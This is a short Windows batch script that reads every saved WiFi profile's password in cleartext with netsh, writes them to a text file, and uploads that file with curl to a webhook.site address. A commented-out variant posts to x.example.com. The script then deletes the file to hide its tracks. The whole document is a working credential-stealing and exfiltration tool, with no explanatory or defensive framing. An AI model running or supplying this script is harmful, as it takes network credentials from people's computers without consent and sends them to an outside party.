@echo off
echo. > wifi_passwords.txt

for /f "tokens=4 delims=: " %%p in ('netsh wlan show profiles ^| find "Profile "') do (
    netsh wlan show profiles name=%%p key=clear | findstr "SSID Cipher Content" | find /v "Number" >> wifi_passwords.txt
	echo. >> wifi_passwords.txt
)

curl "https://webhook.site/eb9447dd-3620-4f1b-81c8-2efd2f2a4513" -F wifi_passwords=@wifi_passwords.txt

::for /f "tokens=2,* " %%i in ('curl -I http://x.example.com ^| findstr "Location:"') do (
::	curl %%i -F wifi_passwords=@wifi_passwords.txt

::	)
del wifi_passwords.txt